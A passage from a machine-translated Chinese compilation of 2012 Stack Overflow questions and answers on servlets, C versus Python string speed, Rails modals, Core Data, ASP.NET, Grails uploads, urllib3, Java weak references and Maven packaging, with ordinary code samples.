<%@ page errorPage="exception.jsp"%>
<%@page contentType="text/html" pageEncoding="UTF-8"%>
<%@ page session="true" import="java.io.*,java.util.*"%>
<%@ page import="eng.ku.sku.exceed_vote.knt.*"%>

  <form name="AddForm" action="addtext" method="POST">
     <input type="hidden" name="todo" value="add">

Add text:<input type="text" name="text" />

    <input type="submit" value="Add">
  </form> 
```

web.xml

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<web-app xmlns="http://java.sun.com/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://java.sun.com/xml/ns/javaee                        

http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd" version="2.5">
<servlet>
<servlet-name>exceed</servlet-name>
<servlet-class>eng.ku.sku.exceed_vote.knt.Controller</servlet-class>
</servlet>

<servlet-mapping>
<servlet-name>exceed</servlet-name>
<url-pattern>/addtext</url-pattern> 
```

控制器.java

```
package eng.ku.sku.exceed_vote.knt;

import java.io.*;
import java.util.*;
import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.*;

@WebServlet("/addtext")
public class Controller extends HttpServlet {
    private static final long serialVersionUID = 1L;

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
         throws ServletException, IOException {
      doPost(request, response);  // Same as doPost()
    }

    @Override
    protected void doPost(HttpServletRequest request,
         HttpServletResponse response) throws ServletException, IOException {

      // Retrieve the current session, or create a new session if no session exists.
      HttpSession session = request.getSession(true);
      System.out.println("HIIEER");
      // Retrieve the shopping cart of the current session.

      // For dispatching the next Page
      String nextPage = "";
      String todo = request.getParameter("todo");

     // Dispatch to checkout.jsp
     nextPage = "/checkout.jsp";

     response.sendRedirect(nextPage);
     return;
   }
} 
```

我阅读了很多其他主题，但没有找到解决方案。我希望你能帮助我:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-15T10:23:10.533

好吧，这是Tomcat的错误配置。

它没有同步项目更改。

# python - 为什么连接两个字符串时 Python 比 C 快？

> ID：12429061
> 
> 赞同：14
> 
> 时间：2012-09-14T17:10:38.237
> 
> 标签：python, c, string, performance

目前我想比较 Python 和 C 在用于字符串处理时的速度。我认为 C 应该比 Python 提供更好的性能；但是，我得到了完全相反的结果。

这是C程序：

```
#include <unistd.h>
#include <sys/time.h>

#define L (100*1024)

char s[L+1024];
char c[2*L+1024];

double time_diff( struct timeval et, struct timeval st )
{
    return 1e-6*((et.tv_sec - st.tv_sec)*1000000 + (et.tv_usec - st.tv_usec ));
}

int foo()
{
    strcpy(c,s);
    strcat(c+L,s);
    return 0;
}

int main()
{
    struct timeval st;
    struct timeval et;
    int i;
    //printf("s:%x\nc:%x\n", s,c);

    //printf("s=%d c=%d\n", strlen(s), strlen(c));
    memset(s, '1', L);
    //printf("s=%d c=%d\n", strlen(s), strlen(c));
    foo();
    //printf("s=%d c=%d\n", strlen(s), strlen(c));
    //s[1024*100-1]=0;

    gettimeofday(&st,NULL);
    for( i = 0 ; i < 1000; i++ ) foo();
    gettimeofday(&et,NULL);

    printf("%f\n", time_diff(et,st));
    return 0;
} 
```

这是 Python 的：

```
import time

s = '1'*102400
def foo():
    c = s + s
    #assert( len(c) == 204800 )

st = time.time()
for x in xrange(1000):
    foo()
et = time.time()

print (et-st) 
```

我得到了什么：

```
root@xkqeacwf:~/lab/wfaster# python cp100k.py 
0.027932882309
root@xkqeacwf:~/lab/wfaster# gcc cp100k.c
root@xkqeacwf:~/lab/wfaster# ./a.out 
0.061820 
```

那有意义吗？还是我只是犯了一些愚蠢的错误？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-09-14T18:14:37.900

累积的评论（主要来自我）转换为答案：

*   如果您使用对字符串长度的了解并使用`memmove()`or`memcpy()`代替`strcpy()`and会发生`strcat()`什么？（我注意到`strcat()`可以替换为`strcpy()`结果没有差异 - 检查时间可能会很有趣。）另外，您没有包含`<string.h>`（或`<stdio.h>`）所以您错过了`<string.h>`可能提供的任何优化！

> *Marcus：*是的，`memmove()`它`strcpy()`比 Python 更快，但为什么呢？一次做`memmove()`一个字宽的副本吗？

*   是的; 在 64 位机器上，为了很好地对齐数据，它可以一次移动 64 位而不是一次移动 8 位；一台 32 位机器，一次可能是 32 位。它也~~只有一个~~更简单的测试可以在每次迭代（计数）时进行，而不是（~~'计数还是空字节'~~）'这是一个空字节'。

> *马库斯：*但`memmove()`即使在我制作之后仍然运作良好`L=L-13`，并且`sizeof(s)`发出了`L+1024-13`。我的机器有一个`sizeof(int)==4`.

*   的代码`memmove()`是高度优化的汇编程序，可能是内联的（没有函数调用开销，尽管对于 100KiB 的数据，函数调用开销是最小的）。好处来自更大的移动和更简单的循环条件。

> *马库斯：*那么 Python 也使用`memmove()`，还是有什么神奇的？

*   我没有查看 Python 源代码，但实际上可以肯定它会跟踪其字符串的长度（它们以空值结尾，但 Python 总是知道字符串的活动部分有多长）。知道长度允许 Python 使用`memmove()`or `memcpy()`（区别在于`memmove()`即使源和目标重叠也能正常工作；`memcpy()`如果它们重叠，则不必正常工作）。他们获得比`memmove/memcpy`可用速度更快的东西相对不太可能。

* * *

我修改了 C 代码以在我的机器（Mac OS X 10.7.4、8 GiB 1333 MHz RAM、2.3 GHz Intel Core i7、GCC 4.7.1）上为我生成更稳定的时序，并比较`strcpy()`和`strcat()`vs`memcpy()`与`memmove()`. 请注意，我将循环计数从 1000 增加到 10000 以提高计时的稳定性，并且我将整个测试（所有三种机制）重复了 10 次。可以说，计时循环计数应该增加另一个 5-10 倍，以便计时超过一秒。

```
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/time.h>

#define L (100*1024)

char s[L+1024];
char c[2*L+1024];

static double time_diff( struct timeval et, struct timeval st )
{
    return 1e-6*((et.tv_sec - st.tv_sec)*1000000 + (et.tv_usec - st.tv_usec ));
}

static int foo(void)
{
    strcpy(c,s);
    strcat(c+L,s);
    return 0;
}

static int bar(void)
{
    memcpy(c + 0, s, L);
    memcpy(c + L, s, L);
    return 0;
}

static int baz(void)
{
    memmove(c + 0, s, L);
    memmove(c + L, s, L);
    return 0;
}

static void timer(void)
{
    struct timeval st;
    struct timeval et;
    int i;

    memset(s, '1', L);
    foo();

    gettimeofday(&st,NULL);
    for( i = 0 ; i < 10000; i++ )
        foo();
    gettimeofday(&et,NULL);
    printf("foo: %f\n", time_diff(et,st));

    gettimeofday(&st,NULL);
    for( i = 0 ; i < 10000; i++ )
        bar();
    gettimeofday(&et,NULL);
    printf("bar: %f\n", time_diff(et,st));

    gettimeofday(&st,NULL);
    for( i = 0 ; i < 10000; i++ )
        baz();
    gettimeofday(&et,NULL);
    printf("baz: %f\n", time_diff(et,st));
}

int main(void)
{
    for (int i = 0; i < 10; i++)
        timer();
    return 0;
} 
```

编译时不会发出警告：

```
gcc -O3 -g -std=c99 -Wall -Wextra -Wmissing-prototypes -Wstrict-prototypes \
    -Wold-style-definition cp100k.c -o cp100k 
```

我得到的时机是：

```
foo: 1.781506
bar: 0.155201
baz: 0.144501
foo: 1.276882
bar: 0.187883
baz: 0.191538
foo: 1.090962
bar: 0.179188
baz: 0.183671
foo: 1.898331
bar: 0.142374
baz: 0.140329
foo: 1.516326
bar: 0.146018
baz: 0.144458
foo: 1.245074
bar: 0.180004
baz: 0.181697
foo: 1.635782
bar: 0.136308
baz: 0.139375
foo: 1.542530
bar: 0.138344
baz: 0.136546
foo: 1.646373
bar: 0.185739
baz: 0.194672
foo: 1.284208
bar: 0.145161
baz: 0.205196 
```

奇怪的是，如果我放弃“无警告”并省略`<string.h>`和`<stdio.h>`标题，就像在原始发布的代码中一样，我得到的时间是：

```
foo: 1.432378
bar: 0.123245
baz: 0.120716
foo: 1.149614
bar: 0.186661
baz: 0.204024
foo: 1.529690
bar: 0.104873
baz: 0.105964
foo: 1.356727
bar: 0.150993
baz: 0.135393
foo: 0.945457
bar: 0.173606
baz: 0.170719
foo: 1.768005
bar: 0.136830
baz: 0.124262
foo: 1.457069
bar: 0.130019
baz: 0.126566
foo: 1.084092
bar: 0.173160
baz: 0.189040
foo: 1.742892
bar: 0.120824
baz: 0.124772
foo: 1.465636
bar: 0.136625
baz: 0.139923 
```

目测这些结果，它似乎比“更干净”的代码更快，虽然我没有对两组数据运行学生 t 检验，而且时间有很大的可变性（但我确实有像 Boinc 运行的东西8个后台进程）。在代码的早期版本中，这种效果似乎更加明显，当时它是公正的`strcpy()`并且`strcat()`经过测试。我没有解释，如果它是一个真正的效果！

**[mvds](https://stackoverflow.com/users/371793/mvds)的跟进**

由于问题已关闭，我无法正确回答。在几乎什么都不做的 Mac 上，我得到了这些时间：

（带标题）

```
foo: 1.694667 bar: 0.300041 baz: 0.301693
foo: 1.696361 bar: 0.305267 baz: 0.298918
foo: 1.708898 bar: 0.299006 baz: 0.299327
foo: 1.696909 bar: 0.299919 baz: 0.300499
foo: 1.696582 bar: 0.300021 baz: 0.299775 
```

（没有标题，忽略警告）

```
foo: 1.185880 bar: 0.300287 baz: 0.300483
foo: 1.120522 bar: 0.299585 baz: 0.301144
foo: 1.122017 bar: 0.299476 baz: 0.299724
foo: 1.124904 bar: 0.301635 baz: 0.300230
foo: 1.120719 bar: 0.300118 baz: 0.299673 
```

预处理器输出（`-E`标志）显示包含标头会转换`strcpy`为内置调用，例如：

```
((__builtin_object_size (c, 0) != (size_t) -1) ? __builtin___strcpy_chk (c, s, __builtin_object_size (c, 2 > 1)) : __inline_strcpy_chk (c, s));
((__builtin_object_size (c+(100*1024), 0) != (size_t) -1) ? __builtin___strcat_chk (c+(100*1024), s, __builtin_object_size (c+(100*1024), 2 > 1)) : __inline_strcat_chk (c+(100*1024), s)); 
```

所以 libc 版本的 strcpy 优于 gcc 内置。（使用`gdb`它很容易验证断点`strcpy`确实不会在`strcpy()`调用中中断，如果包含标题）

在 Linux（Debian 5.0.9，amd64）上，差异似乎可以忽略不计。生成的程序集（`-S`标志）仅在包含所携带的调试信息上有所不同。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-09-14T17:15:27.163

我相信这样做的原因是 Python 字符串不是以空值结尾的。

在 Python 中，字符串长度存储在字符串旁边，允许它在连接字符串时跳过 strcat() 使用的隐式 strlen()。

加上字符串连接是直接在 C 中为 Python 实现的，这可能是原因。

编辑：好吧，现在我实际上查看了 C 代码并看到它使用静态缓冲区，我也很困惑，因为我看不出 Python 如何避免动态分配，这应该慢得多......

# ruby-on-rails - Twitter Bootstrap modal rails删除按钮不起作用

> ID：12429066
> 
> 赞同：1
> 
> 时间：2012-09-14T17:10:54.520
> 
> 标签：ruby-on-rails, twitter-bootstrap

我正在切换到 Twitter Bootstrap 2.1.1。

我有一个带有删除按钮的模式，但它不起作用。在以前的引导程序版本中，它工作正常。Rails 版本是 3.1

这是代码

```
<a title="<%= t('delete') %>" id="delete" class="label" href="#myModal-<%= post.id %>" data-toggle="modal"><%= t('delete') %></a> 
```

情态的

```
<div class="modal hide" id="myModal-<%= post.id %>" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
    <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
        <h3 id="myModalLabel"><%= t('delete_this_question') %></h3>
    </div>
    <div class="modal-body">
        <p><%= raw post.text %></p>
    </div>
    <div class="modal-footer">
        <button class="btn" data-dismiss="modal" aria-hidden="true"><%= t('cancel') %></button>
        <%= link_to(t('delete'), { :controller => 'posts', :action => 'destroy', :id => post.id } ,:method => :delete, :class => 'btn btn-primary') %>
    </div>
</div> 
```

但它不起作用。Rails 收到一个 GET 并显示该帖子，但它不会破坏它。

任何的想法？谢谢

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-14T18:14:33.460

[我在http://rors.org/demos/custom-confirm-in-rails](http://rors.org/demos/custom-confirm-in-rails)上找到了以下解决方案

您可以完全不显眼地使用它，而不必在视图中有自定义删除链接或模式内容。所以在我看来，我有标准的 Rails 链接（只添加了一些类来使用 Bootstrap 样式）：

```
link_to 'delete', post, method: :delete, confirm: 'Are you sure?', class: 'btn btn-mini btn-danger' 
```

以及 /app/assets/javascripts/bootstrap-confirmation.js.coffee 中的以下内容

```
$.rails.allowAction = (link) ->
  return true unless link.attr('data-confirm')
  $.rails.showConfirmDialog(link) # look bellow for implementations
  false # always stops the action since code runs asynchronously

$.rails.confirmed = (link) ->
  link.removeAttr('data-confirm')
  link.trigger('click.rails')

$.rails.showConfirmDialog = (link) ->
  message = link.attr 'data-confirm'
  html = """
         <div class="modal" id="confirmationDialog">
           <div class="modal-header">
             <a class="close" data-dismiss="modal">&times;</a>
             <h3>Request confirmation</h3>
           </div>
           <div class="modal-body">
             <p>#{message}</p>
           </div>
           <div class="modal-footer">
             <a data-dismiss="modal" class="btn">Cancel</a>
             <a data-dismiss="modal" class="btn btn-danger confirm">Confirm</a>
           </div>
         </div>
         """
  $(html).modal()
  $('#confirmationDialog .confirm').on 'click', -> $.rails.confirmed(link) 
```

如果您想在模式中发布更多特定详细信息，您始终可以将它们作为数据属性包含在您的删除链接中（就像`data-confirm`用于显示确认消息一样。）

# tortoisesvn - 使用 TortoiseSVN 意外删除本地文件

> ID：12429070
> 
> 赞同：0
> 
> 时间：2012-09-14T17:11:10.767
> 
> 标签：tortoisesvn

在已移动的文件夹上发生树冲突，但我添加了一个额外的文件。

我一时哑口无言，点了“删除本地”。

有可能找回文件吗？为什么tortoise svn这样删除的东西不去回收站？

编辑：文件恢复工具可以找到文件夹和被移动的文件，但是它似乎没有找到我添加的文件（并且被tortoise svn删除）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T20:42:35.150

如果您添加了文件并且该文件之前没有版本控制，则不会。

“删除无版本文件”避免丢失无版本文件，将它们移动到回收站：[第 4 章。来自 TortoiseSVN 手册的日常使用指南](http://tortoisesvn.net/docs/nightly/TortoiseSVN_en/tsvn-dug-rename.html)

# ios - 关系故障（核心数据）

> ID：12429072
> 
> 赞同：0
> 
> 时间：2012-09-14T17:11:16.127
> 
> 标签：ios, core-data, relationship, fault

我是核心数据的新手，需要帮助解决以下问题：

我有两个实体：Talk 和 Speaker。他们有一对多的关系。

谈话-目的地：演讲者，反向：谈话演讲者-目的地：谈话，反向：演讲者

在两个实体上都选中了“多对多关系”字段。

我有一个表格视图控制器来列出所有可用的谈话。这就是我的做法：

```
- (NSFetchedResultsController *)fetchedResultsController
{
    if (_fetchedResultsController != nil) {
        return _fetchedResultsController;
    }

    NSFetchRequest *fetchRequest = [[NSFetchRequest alloc] init];
    NSEntityDescription *entity = [NSEntityDescription
                                   entityForName:@"Talk" inManagedObjectContext:self.managedObjectContext];
    [fetchRequest setEntity:entity];

    NSSortDescriptor *sort = [[NSSortDescriptor alloc]
                              initWithKey:@"date" ascending:NO];
    [fetchRequest setSortDescriptors:[NSArray arrayWithObject:sort]];
    [fetchRequest setFetchBatchSize:20];

    NSFetchedResultsController *theFetchedResultsController =
    [[NSFetchedResultsController alloc] initWithFetchRequest:fetchRequest
                                        managedObjectContext:self.managedObjectContext sectionNameKeyPath:nil
                                                   cacheName:@"Root"];
    self.fetchedResultsController = theFetchedResultsController;
    _fetchedResultsController.delegate = self;

    return _fetchedResultsController;
} 
```

当我点击一个单元格时，我想加载另一个视图控制器，只显示所选谈话的详细信息。

这就是我正在做的事情：

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
    TalksDetailsViewController *talksDetails = [[TalksDetailsViewController alloc] initWithTalksInfo:[_fetchedResultsController objectAtIndexPath:indexPath]];
    [self.navigationController pushViewController:talksDetails animated:YES];
} 
```

问题是：我在 TalksDetailsViewController 上看不到扬声器。这是发送到 TalksDetailsViewController 的信息：

```
Info: <Talk: 0x6e66920> (entity: Talk; id: 0x6e66880 <x-coredata://4063FE84-E6DB-4588-8133-9A55B512D6C8/Talk/p2> ; data: {
    date = "2012-08-31 03:00:00 +0000";
    id = 7;
    speaker = "<relationship fault: 0x6e994e0 'speaker'>";
    "start_time" = "17:14:55";
}) 
```

我尝试了以下代码，但没有奏效：

```
for (Speaker *speakerInfo in self.talkInfo.speaker) {
        NSLog(@"speaker info: %@", speakerInfo);
} 
```

它永远不会进入 for。

如果我尝试记录 self.talkInfo.speaker 我会得到类似的信息：

```
Relationship 'speaker' fault on managed object (0x7a76c30) <Talk: 0x7a76c30> (entity: Talk; id: 0x7a76b90 <x-coredata://4063FE84-E6DB-4588-8133-9A55B512D6C8/Talk/p2> ; data: {
    date = "2012-08-31 03:00:00 +0000";
    id = 7;
    speaker = "<relationship fault: 0x6bc5990 'speaker'>";
    "start_time" = "17:14:55";
}) 
```

我看到了一些类似的问题，但无法解决我的问题。

有小费吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T19:32:53.697

首先使用 SQLite 浏览器检查对象（[如果没有，请点击此处](https://github.com/sqlitebrowser/sqlitebrowser)）。并确保数据存储在核心数据中。访问模拟器文件`~/Library/Application\ Support/iPhone\ Simulator/XX/Applications/XXXXXXXXXXX/Documents/XXXX.sqlite`。确保`ZTALKS` **表格**有一个**列** `ZSPEAKER`和一个值，这应该对应于**table**`Z_PK`中的值。如果是这样，则关系是连接的。`ZSPEAKER`

 **您的模型应如下所示：

![在此处输入图像描述](../Images/cf1db1b8a131e89b5e1ed3b78ae44095.png)

当您有这样的 Talk 对象时：

```
 Talk *talk = [**YourManagedObjectContext**  executeFetchRequest:fetchRequest error:&error]; 
```

你应该能够像这样抓住它的扬声器：

```
Speaker *speaker = talk.speaker; 
```

我知道这与您的设置有些不同，但希望这会有所帮助。**

# c# - ListBox 鼠标悬停显示 ListItem 文本

> ID：12429077
> 
> 赞同：2
> 
> 时间：2012-09-14T17:11:42.497
> 
> 标签：c#, asp.net, sql, listbox

我正在使用使用 System.Web.UI.WebControls 的库；从 SQL 表中提取数据并将它们作为列表项。但是，当用户将鼠标悬停在项目上时，它应该显示文本（光标悬停的列表项的文本）。我读到您需要使用 System.Windows.Forms; 库，但我不知道如何使用 sql 行填充列表框。

有人帮我如何从 sql 表中填充列表框并使用 mouseover 事件来显示列表项文本？

我正在使用 C#、asp.net 和 Visual Studio (sql manangemetn 2005)。

* * *

**编辑**数据绑定

```
protected void test123(object sender, EventArgs e) 
{ 
    foreach (ListItem item in lstService.Items) 
    { 
        item.Attributes.Add("title", item.Value); 
    } 
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T17:15:08.620

您不需要使用任何控件；只需将标准 HTML 属性添加`title`到您的列表项，这将显示工具提示/鼠标悬停弹出窗口。

```
<asp:ListBox ID="mylist" runat="server">
    <asp:ListItem Text="item1" Value="value1" title="tooltip here" />
</asp:ListBox> 
```

要将它们绑定到数据值，您可以扩展`ListBox`类，或者只是迭代`OnDataBound`事件中的项目：

```
foreach (ListItem item in mylist.Items) item.Attributes.Add(title, item.Value); 
```

# android - Android LVL 不会导入 Eclipse

> ID：12429084
> 
> 赞同：0
> 
> 时间：2012-09-14T17:12:10.060
> 
> 标签：android, android-library, android-lvl

我正在尝试让 Android LVL（应用程序许可）设置与我的软件一起使用......我根本无法将它导入 Eclipse。文档说，“将库文件夹添加到您的工作区”......但它不会让我。我有转。2 下载...但是当我尝试导入项目（从/android-sdk-macosx/extras/google/play_licensing/library）时，它在项目列表中显示为灰色并且不会导入。有人可以帮我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T17:26:19.183

只需将源拖到您的项目中即可。LVL 的目的是您构建自己的源代码并进行更改（试图阻止人们通过查找 LVL 特定位来修改您的二进制文件）。

# grails - 从 ipad 读取 grails 中的图像

> ID：12429085
> 
> 赞同：0
> 
> 时间：2012-09-14T17:12:14.807
> 
> 标签：grails, grails-controller

我对这种事情完全陌生。读取客户端发送的图像是“application/x-www-form-urlencoded” 这是我从该客户端收到的图像，它是一个 ipad 应用程序。它将图像附加到 http 正文并使用 ?id=10 等将其与其他参数一起发送到服务器。问题是....如何从其主体中获取该图像并写入文件系统？

现在我已经编写了一个单独的 servlet 来读取这个图像（使用 request.getInputStream()）并读取它的字节然后写入文件系统，这不好（上下文变得不同）。

在 grails 控制器中做什么，以便它可以轻松读取图像。请帮帮我。对我来说，这是高度优先的。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T21:39:23.743

Grails 支持文件上传。让我们举一个例子来简化事情。

在您看来，您将有一个类似这样的表单：

```
<g:form action="save" method="post" enctype="multipart/form-data">
    <input type="file" name="myFile" />
</g:form> 
```

在您的控制器中，您可以使用以下内容：

```
class FileController {
    def save = {
        def f = request.getFile('myFile')
        if(!f.empty) {
            def fileName = 'file_xyz'
            f.transferTo( new File('imgs/' + fileName) )
        }
        redirect(action:show)
    }
} 
```

如果您需要处理图像（缩放、裁剪......），我建议使用 ImgScalr。见这里： [http ://www.thebuzzmedia.com/software/imgscalr-java-image-scaling-library/](http://www.thebuzzmedia.com/software/imgscalr-java-image-scaling-library/)

# python - 从 URL 中检索 JPG 图片（Python）

> ID：12429088
> 
> 赞同：1
> 
> 时间：2012-09-14T17:12:33.993
> 
> 标签：python, python-imaging-library, urllib3

我正在尝试使用以下 Python 代码从 http ULR 中检索 JPG 图像（以在 GUI 中显示它们）：

```
import urllib3
from cStringIO import StringIO
from PIL import Image

conn = urllib3.connection_from_url('http://www.solarspace.co.uk/')
img_file = conn.urlopen('GET', 'http://www.solarspace.co.uk/PlanetPics/Neptune/NeptuneAlt1.jpg')
image = StringIO(img_file.read())
image.seek(0)
resized_image = Image.open(image) 
```

但是，这给了我这个错误消息：“IOError：无法识别图像文件”。

我使用 urllib3 的原因是因为我需要一个持久连接（发送多个请求），而 urllib/urllib2 则没有。

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T17:50:21.240

一如既往，[`requests`](http://docs.python-requests.org)为了救援：

```
>>> r = requests.get('http://www.solarspace.co.uk/PlanetPics/Neptune/NeptuneAlt1.jpg')
>>> i = Image.open(StringIO.StringIO(r.content))
>>> i.size
(262, 299) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T18:13:27.617

如果您使用`img_file.data`而不是`img_file.read()`. 应在您在请求中`img_file.read()`指定时使用。`preload_content=False`现在我想起来，它不是很直观，也许`img_file.read()`应该知道缓存的预加载内容，或者如果它已经被消费，它应该引发异常。计划是`preload_content=False`默认设置，但事实证明有很多边缘情况属于正常使用情况，很难满足。我打开了一个错误来解决这个问题：[https ://github.com/shazow/urllib3/issues/102](https://github.com/shazow/urllib3/issues/102)

无论如何，使用`img_file.data`应该可以解决您的问题。对困惑感到抱歉！:)

此外，我建议使用`conn.request(...)`而不是 lower-level `conn.urlopen(...)`，`PoolManager`如果您可能要跨域，也许可以使用（没有理由不使用它，真的）。试试这个：

```
>>> http = urllib3.PoolManager()
>>> r = http.request('GET', 'http://www.solarspace.co.uk/PlanetPics/Neptune/NeptuneAlt1.jpg')
>>> resized_image = Image.open(StringIO(r.data)) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-07-07T09:28:41.480

保存时，您可以执行以下操作：

```
with open('##.jpg','wb') as fout:
     fout.write(r.content) 
```

# java - Java中的智能指针和引用计数

> ID：12429091
> 
> 赞同：7
> 
> 时间：2012-09-14T17:12:41.980
> 
> 标签：java, smart-pointers, refcounting

我正在尝试用 Java 编写 DagNode 类，其中两个节点在逻辑上相等，如果它们作为引用相等。

C++（我来自 C++）中的想法是使用智能指针和引用计数：

*   创建节点后，如果该节点已存在，我将在某个表中查找。如果是这样，我将返回一个指向旧指针的指针。否则，创建一个新节点。

*   重载的 C++ 方法（如复制构造函数和析构函数）会进行 ref-counting，当节点的 ref-count 降至 0 时，该节点会从上述表中逐出。（C++ 也会释放内存。）

但是，似乎没有办法在 Java 中自动进行引用计数。我需要进行引用计数以知道何时从表中逐出节点（以便对其进行垃圾收集），并且我真的想避免在每个函数的开始和结束时 调用`node->incRef()`和。`node->decRef()`

我们如何在 Java 中实现这个 C++ 习语？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-14T17:15:52.770

在 Java 中，参考调查和垃圾是自动的。

但这并不意味着它是完全隐藏的。

如果您想知道何时可以对对象进行垃圾处理，您似乎需要[ReferenceQueue](http://docs.oracle.com/javase/7/docs/api/java/lang/ref/ReferenceQueue.html) ，如果您想保留不会阻止垃圾的指针，则可能需要[WeakReference 。](http://docs.oracle.com/javase/7/docs/api/java/lang/ref/WeakReference.html)

我建议您查看[java.lang.ref 包](http://docs.oracle.com/javase/7/docs/api/java/lang/ref/package-summary.html)的描述，以找到满足您需求的最佳解决方案。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T18:14:51.250

> 创建节点时，如果该节点已经存在，则在某个表中查找，如果存在，则返回指向旧节点的指针，否则创建新节点。

在 Java 中制作这种查找机制并不难。只需使用工厂方法，它会检查“表”并返回相同的实例（如果它已经存在）。

> 我需要引用计数，所以我知道什么时候从表中驱逐一个节点（所以它可以被垃圾收集）

因为 Java 有这个`WeakReference`类。它不允许您进行引用计数，但允许在没有人再引用它时对对象进行 GC-ed。

结合这2个，你可以

*   构造一个填充有`WeakReference`s的“表”
*   使用使用 s 的可用 Java`Collection`实现之一`WeakReference`（例如 a `WeakHashmap`）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-12-23T12:17:31.087

用于确定性资源管理的引用计数可以在 Java 中实现。如果您正在使用不由 GC 直接管理的任何类型的系统资源，它会很有用。GC 管理堆内存。但是，如果您使用任何其他类型的资源，例如文件句柄、网络套接字或*本机内存*，则不能依赖 GC（或其机制，例如 finalization 或 ReferenceQueue），因为您可能会发现您已经分配了所有你的资源，但 GC 仍然没有开始，因为还有大量的 Java 堆内存。（在使用 finalization/ReferenceQueue 时要非常小心——[永远不要依赖它们](https://stackoverflow.com/questions/52879761/should-java-9-cleaner-be-preferred-to-finalization)）

看看[almson-refcount](https://github.com/almson/almson-refcount)。这是我在找不到任何独立替代方案后为引用计数而创建的库。它非常简单，并受到另一个成熟框架的启发。

* * *

关于 OP 的问题，尚不清楚他们真正需要什么。他们绝对没有使用系统资源。听起来他们想要一个与 DAG 平行的 HashMap 以优化`get`. 显而易见的方法是使 DAG 双向链接，并在节点从 DAG 中删除时从地图中删除节点。他们不需要 WeakReferences 或通用引用计数，尽管两者都可以使用。

# c# - 我想定义像这样“Text1.Attributes[“onfocus”]”这样接受参数的属性，这里属性是Text1对象的属性接受参数

> ID：12429092
> 
> 赞同：-2
> 
> 时间：2012-09-14T17:12:41.803
> 
> 标签：c#

我想在 c# 中定义属性，它接受像这样的参数“Text1.Attributes[“onfocus”]” 这里属性是 Text1 对象的属性接受参数

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T17:14:18.250

C# 不支持参数化属性。

相反，您需要使用带有这些参数的索引器创建一个类，然后创建一个返回该类实例的属性。

例如：

```
class AttributesCollection : ... {
    public Something this[string name] {
        ...
    }
}
class TextBox {
    public AttributesCollection Attributes { get; }
} 
```

# android - 如何在同一个 Maven 构建中生成 .apklib 和 .apk？

> ID：12429093
> 
> 赞同：2
> 
> 时间：2012-09-14T17:12:44.747
> 
> 标签：android, maven-3, maven-plugin, pom.xml, apklib

所以我正在使用 Android Maven 插件为我的一个库项目生成 apklib 快照。但是库项目也可以自行运行，所以我认为我们应该使用 maven 同时生成 .apklib 和 .apk 。

这是 pom 配置。

```
<groupId>com.comanyname.apps.lib</groupId>
<artifactId>MyProject-lib</artifactId>
<version>1.0.0-SNAPSHOT</version>
<packaging>apklib</packaging>
<name>MyProject-lib</name> 
```

我尝试添加另一个这样的包装

```
<groupId>com.comanyname.apps.lib</groupId>
<artifactId>MyProject-lib</artifactId>
<version>1.0.0-SNAPSHOT</version>
<packaging>apklib</packaging>
<packaging>apk</packaging>
<name>MyProject-lib</name> 
```

我不知道这是否可能。不过，我可以一次将包装切换到 apk/apklib 一个。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-19T15:23:08.363

所以我能够通过创建两个配置文件来创建 apk 和 apklib。

```
<profiles>
        <profile>
            <id>local</id>
            <activation>
                <activeByDefault>true</activeByDefault>
            </activation>
            <properties>
                <projectVersion>1.0.0-SNAPSHOT</projectVersion>
                <packagingType>apk</packagingType>
            </properties>
        </profile>
        <profile>
            <id>build</id>
            <properties>
                <projectVersion>1.0.0-SNAPSHOT</projectVersion>
                <packagingType>apklib</packagingType>
            </properties>
        </profile>
</profiles> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-06T12:33:33.203

推荐的方法是创建两个项目：

1.  Project A 是一个库项目（packagingType of apklib）。它包含所有代码、资源和资产。
2.  项目 B 是一个标准的 Android 项目（apklib 的打包类型），它依赖于项目 A。它不包含代码、资源或资产（尽管您可以根据需要添加一些）。
3.  或者，您可以将项目 A 和 B 作为模块的父项目。然后，每当您构建父项目时，都会构建 apk 和 apklib。

我在自己的项目中使用这种方法，效果很好。我还添加了一个测试项目作为第三个模块，它依赖于 apklib。

[我在https://gist.github.com/4224133](https://gist.github.com/4224133)上添加了项目结构的简化示例。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-14T23:02:14.193

### “但图书馆项目也可以自给自足地独立运行。”

这是不可能的，至少官方 Android SDK 不支持，查看[开发指南](http://developer.android.com/tools/projects/index.html#LibraryProjects)以了解什么是 Android 库项目：

> 但是，库项目与标准 Android 应用程序项目的不同之处在于，您不能将其直接编译为自己的 .apk 并在 Android 设备上运行。同样，您不能将库项目导出到自包含的 JAR 文件，就像对真正的库所做的那样。相反，您必须通过在依赖应用程序中引用库并构建该应用程序来间接编译库。

### “不过，我可以一次将包装切换到 apk/apklib 一个。”

